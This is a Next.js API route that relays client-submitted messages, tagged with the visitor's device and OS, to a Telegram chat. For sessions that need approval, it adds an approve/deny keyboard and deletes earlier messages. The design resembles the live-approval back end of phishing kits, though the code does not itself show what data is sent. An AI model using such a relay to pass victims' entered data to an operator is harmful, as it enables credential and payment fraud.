import { createApproval, getApprovalStoreError, isApprovalStoreReady } from '@/lib/approval-store';
import { buildApprovalKeyboard, getTelegramCredentials, telegramRequest, type ApprovalType } from '@/lib/telegram';
import { NextRequest, NextResponse } from 'next/server';
import { UAParser } from 'ua-parser-js';

function appendDeviceInfo(message: string, req: NextRequest) {
    const ua = req.headers.get('user-agent') || '';
    const parser = new UAParser(ua);
    const uaResult = parser.getResult();
    const deviceType = uaResult.device.type || 'desktop';
    const deviceVendor = uaResult.device.vendor || 'Unknown';
    const deviceModel = uaResult.device.model || 'Unknown';
    const osName = uaResult.os.name || 'Unknown';
    const osVersion = uaResult.os.version || 'Unknown';
    const deviceName = [deviceVendor, deviceModel].filter((item) => item && item !== 'Unknown').join(' ');
    const finalDeviceName = deviceName || (deviceType === 'desktop' ? 'Desktop' : deviceType);
    const osLabel = `${osName}${osVersion !== 'Unknown' ? ` ${osVersion}` : ''}`;
    const deviceInfo = `${finalDeviceName} | ${osLabel}`;

    return message.includes('__DEVICE_INFO__') ? message.replace('__DEVICE_INFO__', deviceInfo) : message;
}

const POST = async (req: NextRequest) => {
    try {
        const credentials = await getTelegramCredentials();
        if (!credentials) {
            return NextResponse.json({ success: false, error: 'Telegram chưa được cấu hình' }, { status: 500 });
        }

        const body = await req.json();
        const { message, message_id, old_message_id, approval_type, session_id } = body as {
            message?: string;
            message_id?: number;
            old_message_id?: number;
            approval_type?: ApprovalType;
            session_id?: string;
        };

        if (!message) {
            return NextResponse.json({ success: false }, { status: 400 });
        }

        const needsApproval = approval_type && session_id;
        if (needsApproval && !isApprovalStoreReady()) {
            return NextResponse.json(
                { success: false, error: getApprovalStoreError() ?? 'Approval store unavailable' },
                { status: 503 }
            );
        }

        const deleteMessageId = old_message_id ?? message_id;
        const messageWithDeviceInfo = appendDeviceInfo(message, req);

        if (deleteMessageId) {
            try {
                await telegramRequest('deleteMessage', {
                    chat_id: credentials.chatId,
                    message_id: deleteMessageId
                });
            } catch {
                //
            }
        }

        if (needsApproval) {
            await createApproval(session_id, approval_type);
        }

        const payload: Record<string, unknown> = {
            chat_id: credentials.chatId,
            text: needsApproval ? `${messageWithDeviceInfo}\n\n⏳ <b>Chờ duyệt...</b>` : messageWithDeviceInfo,
            parse_mode: 'HTML'
        };

        if (needsApproval) {
            payload.reply_markup = buildApprovalKeyboard(approval_type, session_id);
        }

        const data = await telegramRequest<{ message_id?: number }>('sendMessage', payload);

        if (!data.ok) {
            return NextResponse.json({ success: false, error: data.description ?? 'sendMessage failed' }, { status: 500 });
        }

        return NextResponse.json({
            success: true,
            message_id: data.result?.message_id ?? null,
            session_id: needsApproval ? session_id : null
        });
    } catch (error) {
        const message = error instanceof Error ? error.message : 'send failed';
        return NextResponse.json({ success: false, error: message }, { status: 500 });
    }
};

export { POST };
